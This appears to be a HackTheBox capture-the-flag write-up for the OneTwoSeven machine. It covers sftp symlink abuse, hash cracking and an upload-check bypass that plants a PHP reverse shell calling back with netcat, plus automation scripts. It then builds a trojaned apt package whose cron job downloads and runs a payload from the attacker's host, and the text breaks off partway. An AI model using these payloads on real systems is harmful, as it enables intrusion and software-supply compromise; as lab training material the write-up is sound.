@@ -1,0 +1,811 @@
+---
+layout: default
+title: OneTwoSeven
+---
+
+<h1>OneTwoSeven</h1>
+<p class="date">31/08/2019</p>
+
+<img class="img-fluid" src="/static/img/htb/onetwoseven/onetwoseven.png">
+
+<p><code>onetwoseven</code> is a really interesting linux machine which requires some <code>sftp</code> enumeration and making a simple port forwarding in order to get user. But to get root, things get harder and we'll need to make some source code review and create and serve our own malicious <code>apt</code> repository.</p>
+
+<div class="flexcontainer">
+    <a class="link-box" href="#user">User</a>
+    <a class="link-box" href="#privesc">Privilege Escalation</a>
+</div>
+
+<hr>
+
+<h2 id="user">User</h2>
+
+<p>First, run <code>nmap</code> to see we only have port <code>22</code> and <code>80</code> open.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb# nmap -sC -sV 10.10.10.133
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-02 10:37 EDT
+Nmap scan report for 10.10.10.133
+Host is up (0.21s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 48:6c:93:34:16:58:05:eb:9a:e5:5b:96:b6:d5:14:aa (RSA)
+|   256 32:b7:f3:e2:6d:ac:94:3e:6f:11:d8:05:b9:69:58:45 (ECDSA)
+|_  256 35:52:04:dc:32:69:1a:b7:52:76:06:e3:6c:17:1e:ad (ED25519)
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Page moved.
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</pre>
+
+<p>On the Apache server we have the following website.</p>
+
+<img class="img-fluid" src="/static/img/htb/onetwoseven/1.png">
+
+<p>If we click on the sign up button we get some credentials to access via <code>sftp</code> to the machine.</p>
+
+<img class="img-fluid" src="/static/img/htb/onetwoseven/2.png">
+
+<p>Let's add those domains to <code>/etc/hosts</code> to create the relations on our machine.</p>
+
+<pre class="prettyprint">
+10.10.10.133	onetwoseven.htb www.onetwoseven.htb
+</pre>
+
+<p>Then, if we visit our personal home page as the sign up page said (<code>http://www.onetwoseven.htb/~ots-5MGVkZWI</code>) we get an empty page.</p>
+
+<img class="img-fluid" src="/static/img/htb/onetwoseven/3.png">
+
+<p>Also, connecting via <code>ssh</code> with those credentials warns us that this service only allows <code>sftp</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/onetwoseven# ssh ots-5MGVkZWI@10.10.10.133
+ots-5MGVkZWI@10.10.10.133's password: 
+This service allows sftp connections only.
+Connection to 10.10.10.133 closed.
+</pre>
+
+<p>We just have to use the same credentials and use <code>sftp</code> to login.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/onetwoseven# sftp ots-5MGVkZWI@10.10.10.133
+ots-5MGVkZWI@10.10.10.133's password: 4d90edeb
+Connected to ots-5MGVkZWI@10.10.10.133.
+sftp> 
+</pre>
+
+<p>Here we can upload files, which will be available in our home page.</p>
+
+<pre class="prettyprint">
+sftp> put test.php 
+Uploading test.php to /public_html/test.php
+test.php                                             100%   21     0.1KB/s   00:00    
+</pre>
+
+<p>Unfortunately, if we try to access to any <code>php</code> file we'll get a forbidden error.</p>
+
+<img class="img-fluid" src="/static/img/htb/onetwoseven/4.png">
+
+<p>On the website information there's an explanation about why we can't access those <code>php</code> files.</p>
+
+<img class="img-fluid" src="/static/img/htb/onetwoseven/5.png">
+
+<p>In this <code>sftp</code> session we are limited only to our home folder, so looking for help about what we can do with this service we come across the following commands.</p>
+
+<pre class="prettyprint">
+sftp> help
+Available commands:
+bye                                Quit sftp
+cd path                            Change remote directory to 'path'
+chgrp grp path                     Change group of file 'path' to 'grp'
+chmod mode path                    Change permissions of file 'path' to 'mode'
+chown own path                     Change owner of file 'path' to 'own'
+df [-hi] [path]                    Display statistics for current directory or
+                                   filesystem containing 'path'
+exit                               Quit sftp
+get [-afPpRr] remote [local]       Download file
+reget [-fPpRr] remote [local]      Resume download file
+reput [-fPpRr] [local] remote      Resume upload file
+help                               Display this help text
+lcd path                           Change local directory to 'path'
+lls [ls-options [path]]            Display local directory listing
+lmkdir path                        Create local directory
+ln [-s] oldpath newpath            Link remote file (-s for symlink)
+lpwd                               Print local working directory
+ls [-1afhlnrSt] [path]             Display remote directory listing
+lumask umask                       Set local umask to 'umask'
+mkdir path                         Create remote directory
+progress                           Toggle display of progress meter
+put [-afPpRr] local [remote]       Upload file
+pwd                                Display remote working directory
+quit                               Quit sftp
+rename oldpath newpath             Rename remote file
+rm path                            Delete remote file
+rmdir path                         Remove remote directory
+symlink oldpath newpath            Symlink remote file
+version                            Show SFTP version
+!command                           Execute 'command' in local shell
+!                                  Escape to local shell
+?                                  Synonym for help
+</pre>
+
+<p>The one which is interesting is <code>symlink</code>, which allows us to create links referencing other files and therefore access to files outside our folder.</p>
+
+<p>Here we're creating a file <code>link</code> in our folder that references <code>/etc/passwd</code>.</p>
+
+<pre class="prettyprint">
+sftp> symlink /etc/passwd link
+</pre>
+
+<p>Then if we access to the website and visit the file <code>link</code> (<code>http://onetwoseven.htb/~ots-5MGVkZWI/link</code>) we get the contents of <code>/etc/passwd</code>.</p>
+
+<pre class="prettyprint">
+ots-yODc2NGQ:x:999:999:127.0.0.1:/home/web/ots-yODc2NGQ:/bin/false
+ots-5MGVkZWI:x:1001:1001:10.10.16.55:/home/web/ots-5MGVkZWI:/bin/false
+</pre>
+
+<p>Now instead of referencing a single file, we're going to make a <code>symlink</code> to <code>/</code>.</p>
+
+<pre class="prettyprint">
+sftp> symlink / caca
+</pre>
+
+<p>And visiting <code>http://onetwoseven.htb/~ots-5MGVkZWI/caca/</code> gives us a directory listing of the whole filesystem.</p>
+
+<img class="img-fluid" src="/static/img/htb/onetwoseven/6.png">
+
+<p>Enumerating a bit we can find the swap file <code>/var/www/html-admin/.login.php.swp</code>. We can view some of its contents using <code>strings</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/onetwoseven# strings login.php.swp 
+b0VIM 8.0
+u\k*
+root
+onetwoseven
+/var/www/html-admin/login.php
+utf-8
+3210
+#"! 
+	    &lt;table>
+            &lt;h4 class = "form-signin-heading">&lt;font size="-1" color="red"><?php echo $msg; ?>&lt;/font>&lt;/h4>
+         &lt;form action="/login.php" method="post">
+...
+	      if ($_POST['username'] == 'ots-admin' && hash('sha256',$_POST['password']) == '11c5a42c9d74d5442ef3cc835bda1b3e7cc7f494e704a10d0de426b2fbe5cbd8') {
+            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
+...
+</pre>
+
+<p>There we have a username (<code>ots-admin</code>) and a <code>sha256</code> hashed password, let's crack it with <code>john</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/onetwoseven# john ots.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-SHA256 [SHA256 128/128 AVX 4x])
+Warning: poor OpenMP scalability for this hash type, consider --fork=4
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Homesweethome1   (?)
+1g 0:00:00:01 DONE (2019-06-04 16:00) 0.6993g/s 7768Kp/s 7768Kc/s 7768KC/s IloveBrandiLynn..Hannah//*12
+Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
+Session completed
+</pre>
+
+<p>On the source code of the main website we have the following commented link, but we can't access directly.</p>
+
+<pre class="prettyprint">
+&lt;!-- Only enable link if access from trusted networks admin/20190212 -->
+        &lt;!-- Added localhost admin/20190214 -->
+		  &lt;li class="nav-item">&lt;a id="adminlink" class="nav-link disabled" href="http://onetwoseven.htb:60080/">Admin&lt;/a>&lt;/li>
+</pre>
+
+<p>I'm making a dynamic port forwarding which will allow to make any TCP connection through onetwoseven if we use <code>proxychains</code>, then we should be able to connect to port <code>60080</code>.</p> 
+
+<p class="challenge-description">
+man <b>ssh</b>:<br>
+<b>-f</b> To request ssh to go background.<br>
+<b>-N</b> Do not execute a remote command.<br>
+<b>-D</b> Dynamic port forwarding.
+</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/onetwoseven# ssh -fND 1337 ots-5MGVkZWI@10.10.10.133
+ots-5MGVkZWI@10.10.10.133's password: 4d90edeb
+</pre>
+
+<p>Next, modify proxychains configuration (<code>/etc/proxychains.conf</code>) in our local machine and add the following line to use the specified port to connect with <code>SOCKS5</code>.</p>
+
+<pre class="prettyprint">
+socks5 	127.0.0.1 1337
+</pre>
+
+<p>We can confirm everything works as expected making a <code>curl</code> request through <code>proxychains</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/onetwoseven# proxychains curl http://127.0.0.1:60080/
+ProxyChains-3.1 (http://proxychains.sf.net)
+&lt;!doctype html>
+&lt;html lang="en">
+  &lt;head>
+    &lt;meta charset="utf-8">
+    &lt;meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    &lt;meta name="description" content="">
+    &lt;meta name="author" content="Mark Otto, Jacob Thornton, and Bootstrap contributors">
+    &lt;meta name="generator" content="Jekyll v3.8.5">
+    &lt;title>OneTwoSeven&lt;/title>
+...
+</pre>
+
+<p>Now, to access to the website through the browser, we're going to configure Burp on User options to use our port forward as a socks proxy and send our browser requests through Burp.</p>
+
+<img class="img-fluid" src="/static/img/htb/onetwoseven/7.png">
+
+<p>Now we're able to connect to the admin panel with firefox.</p>
+
+<img class="img-fluid" src="/static/img/htb/onetwoseven/8.png">
+
+<p>Use the obtained credentials to access (<code>ots-admin</code> / <code>Homesweethome1</code>).</p>
+
+<img class="img-fluid" src="/static/img/htb/onetwoseven/9.png">
+
+<p>Clicking on <code>OTS Default User</code> we get the credentials for the default user.</p>
+
+<img class="img-fluid" src="/static/img/htb/onetwoseven/10.png">
+
+<p>If we use his credentials through <code>sftp</code> we can access to his folder where the user flag is stored.
+
+<pre class="prettyprint">
+root@kali:~/htb/onetwoseven# sftp ots-yODc2NGQ@10.10.10.133
+ots-yODc2NGQ@10.10.10.133's password: f528764d
+Connected to ots-yODc2NGQ@10.10.10.133.
+sftp> ls
+public_html  user.txt     
+sftp> get user.txt
+Fetching /user.txt to user.txt
+/user.txt                                 100%   33     0.3KB/s   00:00
+</pre>
+
+<pre class="prettyprint">
+root@kali:~/htb/onetwoseven# cat user.txt
+<span flag="93a4ce6d82bd35da033206ef98b486f4">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
+
+<h2 id="privesc">Privilege Escalation</h2>
+
+<p>Clicking on <code>OTS Addon Manager</code> gives us the following information.</p>
+
+<img class="img-fluid" src="/static/img/htb/onetwoseven/11.png">
+
+<p>A <code>POST</code> request to <code>/addon-upload.php</code> results in a <code>404</code> error what should mean the feature is disabled.</p>
+
+<p>If we inspect the source code we can see the file upload occurs when the uri matches with the regex <code>/\/addon-upload.php/</code>.</p>
+
+<pre class="prettyprint">
+    case preg_match('/\/addon-upload.php/',$_SERVER['REQUEST_URI']):
+        if(isset($_FILES['addon'])){
+            $errors= array();
+            $file_name = basename($_FILES['addon']['name']);
+            $file_size =$_FILES['addon']['size'];
+            $file_tmp =$_FILES['addon']['tmp_name'];
+</pre>
+
+<p>So we can trick the application and use the path <code>/menu.php?addon=addons/ots-man-addon.php&a=/addon-upload.php</code> to match the regex but not calling directly <code>/addon-upload.php</code> because it's disabled. Then upload our php addon which has to follow the structure of the others.</p>
+
+<pre class="prettyprint">
+POST /addon-download.php?addon=addons/ots-man-addon.php&a=/addon-upload.php HTTP/1.1
+Host: 127.0.0.1:60080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1:60080/menu.php
+Content-Type: multipart/form-data; boundary=---------------------------16077088781772876987425657822
+Content-Length: 296
+Cookie: hblid=sybgLKxjVma91Cr93m39N0T6F0W0W2A0; olfsk=olfsk1877586908028661; PHPSESSID=jmin5rcmopq0i6kcjken5kcks1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+-----------------------------16077088781772876987425657822
+Content-Disposition: form-data; name="addon"; filename="ots-caca.php";
+Content-Type: application/x-php
+
+&lt;?php 
+# OneTwoSeven Admin Plugin
+# OTS caca
+system('nc 10.10.16.55 6969 -e /bin/bash');
+?>
+
+-----------------------------16077088781772876987425657822--
+</pre>
+
+<p>Now clicking on our addon (<code>/menu.php?addon=addons/ots-caca.php</code>) makes a reverse shell to our machine.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/onetwoseven# nc -nlvp 6969
+listening on [any] 6969 ...
+connect to [10.10.16.55] from (UNKNOWN) [10.10.10.133] 48586
+whoami
+www-admin-data
+</pre>
+
+<p>I automated the process of creating the addon and executing it with the following <code>python</code> script.</p>
+
+<pre class="prettyprint">
+import requests
+import netifaces
+
+proxies = {'http': 'socks5://127.0.0.1:1337'}
+
+base_url = 'http://127.0.0.1:60080/'
+r = requests.get(base_url, proxies = proxies)
+cookie = r.headers['Set-Cookie']
+
+url = base_url + 'login.php'
+data = 'username=ots-admin&password=Homesweethome1&login='
+headers = {'Cookie': cookie, 'Content-Type': 'application/x-www-form-urlencoded'}
+r = requests.post(url, data=data, headers=headers, proxies=proxies)
+
+my_ip = netifaces.ifaddresses('tun0')[netifaces.AF_INET][0]['addr']
+file = {'addon': ('ots-caca.php', """<?php 
+# OneTwoSeven Admin Plugin
+# OTS CACA
+system('nc """ + my_ip + """ 6969 -e /bin/bash'); 
+?>""")}
+headers = {'Cookie': cookie}
+url = base_url + 'addon-download.php?addon=addons/ots-man-addon.php&a=/addon-upload.php'
+r = requests.post(url, files=file, headers=headers, proxies=proxies) 
+
+url = base_url + 'menu.php?addon=addons/ots-caca.php'
+headers = {'Cookie': cookie}
+r = requests.get(url, headers=headers, proxies=proxies, timeout=3)
+</pre>
+
+<p>And also the whole process to obtain a shell with this <code>bash</code> script.</p>
+
+<pre class="prettyprint">
+GREEN='\033[0;32m'
+NC='\033[0m'
+ip=$(/sbin/ip -o -4 addr list tun0 | awk '{print $4}' | cut -d/ -f1)
+user=$(php -r "echo 'ots-' . substr(str_replace('=','',base64_encode(substr(md5('$ip'),0,8))),3);")
+pass=$(php -r "echo substr(md5('$ip'),0,8);")
+echo -e "${GREEN}[+]${NC} Hello $user / $pass"
+echo -e "${GREEN}[+]${NC} Port forwarding"
+sshpass -p$pass ssh -fND 1337 $user@10.10.10.133
+echo -e "${GREEN}[+]${NC} Doing request things"
+python shell.py 2>/dev/null &
+echo -e "${GREEN}[+]${NC} Gimme shell"
+nc -nlvp 6969
+</pre>
+
+<pre class="prettyprint">
+root@kali:~/htb/onetwoseven# ./shell.sh 
+[+] Hello ots-iMDE3OTQ / dfb01794
+[+] Port forwarding
+[+] Doing request things
+[+] Gimme shell
+listening on [any] 6969 ...
+connect to [10.10.16.55] from (UNKNOWN) [10.10.10.133] 51436
+whoami
+www-admin-data
+</pre>
+
+<p>Upgrade the shell.</p>
+
+<pre class="prettyprint">
+python -c 'import pty;pty.spawn("/bin/bash")'
+www-admin-data@onetwoseven:/var/www/html-admin$ 
+</pre>
+
+<p>We can see our user <code>www-admin</code> can run <code>apt-get update</code> and <code>upgrade</code> as root.</p>
+
+<pre class="prettyprint">
+www-admin-data@onetwoseven:/home$ sudo -l
+sudo -l
+Matching Defaults entries for www-admin-data on onetwoseven:
+    env_reset, env_keep+="ftp_proxy http_proxy https_proxy no_proxy",
+    mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-admin-data may run the following commands on onetwoseven:
+    (ALL : ALL) NOPASSWD: /usr/bin/apt-get update, /usr/bin/apt-get upgrade
+</pre>
+
+<p>On the <code>apt</code> sources we can see there's a repository not used.</p>
+
+<pre class="prettyprint">
+www-admin-data@onetwoseven:/etc/apt/sources.list.d$ cat onetwoseven.list 
+# OneTwoSeven special packages - not yet in use
+deb http://packages.onetwoseven.htb/devuan ascii main
+</pre>
+
+<p>What we're going to do is create our own repository in our machine with a malicious package and impersonate <code>packages.onetwoseven.htb</code> to elevate privileges.</p>
+
+<p>First, we need to send the traffic to our machine setting the <code>http_proxy</code> environment variable.</p>
+
+<pre class="prettyprint">
+www-admin-data@onetwoseven:/$ export http_proxy=http://10.10.16.55:8080
+</pre>
+
+<p>Then, open Burp and configure it to listen on our htb IP or <code>0.0.0.0</code>. Next, if we run <code>sudo /usr/bin/apt-get update</code> we'll start to see traffic on the proxy history.</p>
+
+<img class="img-fluid" src="/static/img/htb/onetwoseven/12.png">
+
+<p>Set the following relation in our <code>/etc/hosts</code> to make those requests be processed by us.</p>
+
+<pre class="prettyprint">
+127.0.0.1   packages.onetwoseven.htb
+</pre>
+
+<p>If we start a <code>SimpleHTTPServer</code> and run update again we'll see how it starts asking for files to us.</p>
+
+<pre class="prettyprint long">
+root@kali:~/htb/onetwoseven/apt# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+127.0.0.1 - - [14/Jul/2019 15:51:51] code 404, message File not found
+127.0.0.1 - - [14/Jul/2019 15:51:51] "GET /devuan/dists/ascii/InRelease HTTP/1.1" 404 -
+127.0.0.1 - - [14/Jul/2019 15:51:51] code 404, message File not found
+127.0.0.1 - - [14/Jul/2019 15:51:51] "GET /devuan/dists/ascii/Release HTTP/1.1" 404 -
+127.0.0.1 - - [14/Jul/2019 15:51:51] code 404, message File not found
+127.0.0.1 - - [14/Jul/2019 15:51:51] "GET /devuan/dists/ascii/main/binary-amd64/Packages.xz HTTP/1.1" 404 -
+127.0.0.1 - - [14/Jul/2019 15:51:52] code 404, message File not found
+127.0.0.1 - - [14/Jul/2019 15:51:52] "GET /devuan/dists/ascii/main/binary-all/Packages.xz HTTP/1.1" 404 -
+127.0.0.1 - - [14/Jul/2019 15:51:52] code 404, message File not found
+127.0.0.1 - - [14/Jul/2019 15:51:52] "GET /devuan/dists/ascii/main/i18n/Translation-en.xz HTTP/1.1" 404 -
+127.0.0.1 - - [14/Jul/2019 15:51:52] code 404, message File not found
+127.0.0.1 - - [14/Jul/2019 15:51:52] "GET /devuan/dists/ascii/main/binary-amd64/Packages.bz2 HTTP/1.1" 404 -
+127.0.0.1 - - [14/Jul/2019 15:51:53] code 404, message File not found
+127.0.0.1 - - [14/Jul/2019 15:51:53] "GET /devuan/dists/ascii/main/binary-all/Packages.bz2 HTTP/1.1" 404 -
+127.0.0.1 - - [14/Jul/2019 15:51:53] code 404, message File not found
+127.0.0.1 - - [14/Jul/2019 15:51:53] "GET /devuan/dists/ascii/main/i18n/Translation-en.bz2 HTTP/1.1" 404 -
+127.0.0.1 - - [14/Jul/2019 15:51:54] code 404, message File not found
+127.0.0.1 - - [14/Jul/2019 15:51:54] "GET /devuan/dists/ascii/main/binary-amd64/Packages.lzma HTTP/1.1" 404 -
+127.0.0.1 - - [14/Jul/2019 15:51:54] code 404, message File not found
+127.0.0.1 - - [14/Jul/2019 15:51:54] "GET /devuan/dists/ascii/main/binary-all/Packages.lzma HTTP/1.1" 404 -
+127.0.0.1 - - [14/Jul/2019 15:51:55] code 404, message File not found
+127.0.0.1 - - [14/Jul/2019 15:51:55] "GET /devuan/dists/ascii/main/i18n/Translation-en.lzma HTTP/1.1" 404 -
+127.0.0.1 - - [14/Jul/2019 15:51:55] code 404, message File not found
+127.0.0.1 - - [14/Jul/2019 15:51:55] "GET /devuan/dists/ascii/main/binary-amd64/Packages.gz HTTP/1.1" 404 -
+127.0.0.1 - - [14/Jul/2019 15:51:56] code 404, message File not found
+127.0.0.1 - - [14/Jul/2019 15:51:56] "GET /devuan/dists/ascii/main/binary-all/Packages.gz HTTP/1.1" 404 -
+127.0.0.1 - - [14/Jul/2019 15:51:56] code 404, message File not found
+127.0.0.1 - - [14/Jul/2019 15:51:56] "GET /devuan/dists/ascii/main/i18n/Translation-en.gz HTTP/1.1" 404 -
+127.0.0.1 - - [14/Jul/2019 15:51:57] code 404, message File not found
+127.0.0.1 - - [14/Jul/2019 15:51:57] "GET /devuan/dists/ascii/main/binary-amd64/Packages.lz4 HTTP/1.1" 404 -
+127.0.0.1 - - [14/Jul/2019 15:51:57] code 404, message File not found
+127.0.0.1 - - [14/Jul/2019 15:51:57] "GET /devuan/dists/ascii/main/binary-all/Packages.lz4 HTTP/1.1" 404 -
+127.0.0.1 - - [14/Jul/2019 15:51:58] code 404, message File not found
+127.0.0.1 - - [14/Jul/2019 15:51:58] "GET /devuan/dists/ascii/main/i18n/Translation-en.lz4 HTTP/1.1" 404 -
+127.0.0.1 - - [14/Jul/2019 15:51:59] code 404, message File not found
+127.0.0.1 - - [14/Jul/2019 15:51:59] "GET /devuan/dists/ascii/main/binary-amd64/Packages HTTP/1.1" 404 -
+127.0.0.1 - - [14/Jul/2019 15:51:59] code 404, message File not found
+127.0.0.1 - - [14/Jul/2019 15:51:59] "GET /devuan/dists/ascii/main/binary-all/Packages HTTP/1.1" 404 -
+127.0.0.1 - - [14/Jul/2019 15:52:00] code 404, message File not found
+127.0.0.1 - - [14/Jul/2019 15:52:00] "GET /devuan/dists/ascii/main/i18n/Translation-en HTTP/1.1" 404 -
+</pre>
+
+<p>To create the malicious package I followed <a href="https://versprite.com/blog/apt-mitm-package-injection" target="_blank">this guide</a> and I chose to impersonate <code>xauth</code>.</p>
+
+<pre class="prettyprint">
+www-admin-data@onetwoseven:/$ dpkg -l | grep xauth
+ii  xauth                                  1:1.0.9-1+b2                       amd64        X authentication utility
+</pre>
+
+<p>Download it from the <a href="https://packages.debian.org/stretch/amd64/xauth/download" target="_blank"> official repository and extract its contents.</a>
+
+<pre class="prettyprint">
+root@kali:~/htb/onetwoseven# dpkg-deb -R xauth_1.0.9-1+b2_amd64.deb modified_xauth
+</pre>
+
+<p>We have to modify <code>DEBIAN/control</code> file and increment the version number, from <code>1:1.0.9-1+b2</code> to <code>1:1.0.9-1+b3</code> in my example.</p> 
+
+<pre class="prettyprint">
+root@kali:~/htb/onetwoseven# cat modified_xauth/DEBIAN/control 
+Package: xauth
+Source: xauth (1:1.0.9-1)
+Version: 1:1.0.9-1+b2
+Architecture: amd64
+Maintainer: Debian X Strike Force &lt;debian-x@lists.debian.org>
+Installed-Size: 82
+Depends: libc6 (>= 2.14), libx11-6, libxau6, libxext6, libxmuu1
+Section: x11
+Priority: optional
+Description: X authentication utility
+ xauth is a small utility to read and manipulate Xauthority files, which
+ are used by servers and clients alike to control authentication and access
+ to X sessions.
+</pre>
+
+<p>Create the script which we want to be executed. I made it to simply download a file from my machine and execute it.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/onetwoseven/modified_xauth# cat usr/bin/my_script 
+#!/bin/sh
+rm /tmp/caca
+wget http://10.10.16.55/caca -O /tmp/caca
+chmod 700 /tmp/caca
+/tmp/caca
+</pre>
+
+<p>Assign execution permissions.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/onetwoseven/modified_xauth# chmod +x usr/bin/my_script
+</pre>
+
+<p>Create or modify <code>DEBIAN/postinst</code> file which will be executed after the installation and in my case I added a cron job to run <code>my_script</code> every 5 minutes.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/onetwoseven/modified_xauth# cat DEBIAN/postinst 
+#!/bin/sh
+
+crontab -l | { cat; echo "*/5 * * * * /usr/bin/my_script "; } | crontab -
+
+exit 0
+</pre>
+
+<p>Assign the correct permissions.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/onetwoseven/modified_xauth# chmod 0775 DEBIAN/postinst
+</pre>
+
+<p>Build the package again.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/onetwoseven# dpkg-deb -b modified_xauth xauth_1.0.9-1+b3_amd64.deb
+dpkg-deb: building package 'xauth' in 'xauth_1.0.9-1+b3_amd64.deb'.
+</pre>
+
+<p>Get the <code>sha256</code> and <code>md5</code> hashes and the size of the file.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/onetwoseven# sha256sum xauth_1.0.9-1+b3_amd64.deb
+b94ecc31a45584c6be9e6b0c8ab5681f63968da9aa809aa278b16cfd7fb001ea  xauth_1.0.9-1+b3_amd64.deb
+root@kali:~/htb/onetwoseven# md5sum xauth_1.0.9-1+b3_amd64.deb 
+6565442fd17512384d6374049256500a  xauth_1.0.9-1+b3_amd64.deb
+root@kali:~/htb/onetwoseven# ls -la xauth_1.0.9-1+b3_amd64.deb 
+-rw-r--r-- 1 root root 39852 Aug  5 10:45 xauth_1.0.9-1+b3_amd64.deb
+</pre>
+
+<p>Create the following structure to build the repository.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/onetwoseven/apt# tree
+.
+└── devuan
+    └── dists
+        └── ascii
+            └── main
+                └── binary-amd64
+</pre>
+
+<p>Using <code>grep</code> on onetwoseven retrieve the package information.</p>
+
+<pre class="prettyprint">
+www-admin-data@onetwoseven:/$ grep -h -B 15 -A 15 -R "xauth_1.0.9-1+b2" /var/lib/apt/lists/ 2>/dev/null
+SHA256: d20deac4ec93b27ccaaba5417005db196beb6cefa52736c75aa7f2140d18660b
+
+Package: xauth
+Version: 1:1.0.9-1+b2
+Installed-Size: 82
+Maintainer: Debian X Strike Force &lt;debian-x@lists.debian.org>
+Architecture: amd64
+Depends: libc6 (>= 2.14), libx11-6, libxau6, libxext6, libxmuu1
+Description: X authentication utility
+Description-md5: 20c8545ce7ba7273dbeefb5186103e04
+Source: xauth (1:1.0.9-1)
+Tag: implemented-in::c, interface::commandline, role::program,
+ scope::utility, security::authentication
+Section: x11
+Priority: optional
+Filename: pool/DEBIAN/main/x/xauth/xauth_1.0.9-1+b2_amd64.deb
+Size: 39556
+MD5sum: f03ab9839c9030fa806c402256ec9346
+SHA256: 48f7bb31fc3bae82a9859d44e299675f2a8448354423ac70477405071d7ff04d
+
+Package: xautolock
+Version: 1:2.2-5.1+b1
+Installed-Size: 67
+Maintainer: Wei Liu &lt;liuw@liuw.name>
+Architecture: amd64
+Depends: libc6 (>= 2.7), libx11-6, libxext6, libxss1
+Recommends: xtrlock | xscreensaver | i3lock | suckless-tools
+Description: Program launcher for idle X sessions
+Description-md5: 2589584ae9ec776d5d2ca89d7ad0fb5f
+Source: xautolock (1:2.2-5.1)
+Tag: hardware::input, interface::graphical, interface::x11, role::program,
+</pre>
+
+<p>Copy and modify that package information with the new hashes, version and size.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/onetwoseven/apt# cat devuan/dists/ascii/main/binary-amd64/Packages
+Package: xauth
+Version: 1:1.0.9-1+b3
+Installed-Size: 82
+Maintainer: Debian X Strike Force &lt;debian-x@lists.debian.org>
+Architecture: amd64
+Depends: libc6 (>= 2.14), libx11-6, libxau6, libxext6, libxmuu1
+Description: X authentication utility
+Description-md5: 20c8545ce7ba7273dbeefb5186103e04
+Source: xauth (1:1.0.9-1)
+Tag: implemented-in::c, interface::commandline, role::program,
+ scope::utility, security::authentication
+Section: x11
+Priority: optional
+Filename: pool/DEBIAN/main/x/xauth/xauth_1.0.9-1+b3_amd64.deb
+Size: 39852
+MD5sum: 6565442fd17512384d6374049256500a
+SHA256: b94ecc31a45584c6be9e6b0c8ab5681f63968da9aa809aa278b16cfd7fb001ea
+</pre>
+
+<p>Compress the file.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/onetwoseven/apt/devuan/dists/ascii/main/binary-amd64# gzip Packages -c > Packages.gz
+</pre>
+
+<p>Get the hashes and size of both files.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/onetwoseven/apt/devuan/dists/ascii/main/binary-amd64# md5sum *; sha256sum *; ls -l;
+5b0d1a88d9ba9771108707245e7f8e8d  Packages
+7e53032c0961d025abafe71ee38fa42f  Packages.gz
+8f3f14d47c00ea94079d441ad4d1d5aa0dc5625c65574a0159c3d33bb7e439e1  Packages
+8571fcde21f86e943211624fa1109371225b77bd4e1ac252ae5102fba2071061  Packages.gz
+total 8
+-rw-r--r-- 1 root root 641 Aug  5 11:09 Packages
+-rw-r--r-- 1 root root 460 Aug  5 11:10 Packages.gz
+</pre>
+
+<p>Create the <code>Release</code> file with the information about the Packages files.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/onetwoseven/apt/devuan/dists/ascii# cat Release
+Origin: Devuan
+Label: ascii
+Suite: ascii
+Version: 2.0.0
+Codename: ascii
+Date: Mon, 05 Aug 2019 10:20:31 UTC
+Architectures: amd64
+Components: main
+MD5Sum:
+ 5b0d1a88d9ba9771108707245e7f8e8d 705 main/binary-amd64/Packages
+ 7e53032c0961d025abafe71ee38fa42f  517 main/binary-amd64/Packages.gz
+SHA256:
+ 8f3f14d47c00ea94079d441ad4d1d5aa0dc5625c65574a0159c3d33bb7e439e1 641 main/binary-amd64/Packages
+ 8571fcde21f86e943211624fa1109371225b77bd4e1ac252ae5102fba2071061  460 main/binary-amd64/Packages.gz
+</pre>
+
+<p>We'll need to sign the <code>Release</code> file in order to make it work, so generate a <code>gpg</code> key if you don't have one already.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/onetwoseven# gpg --gen-key
+</pre>
+
+<p>Sign <code>Release</code> to generate <code>Release.gpg</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/onetwoseven/apt/devuan/dists/ascii# gpg -abs -o Release.gpg Release
+</pre>
+
+<p>Move the malicious payload to the correct location and, finally we get the following structure.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/onetwoseven/apt# tree
+.
+└── devuan
+    ├── dists
+    │   └── ascii
+    │       ├── main
+    │       │   └── binary-amd64
+    │       │       ├── Packages
+    │       │       └── Packages.gz
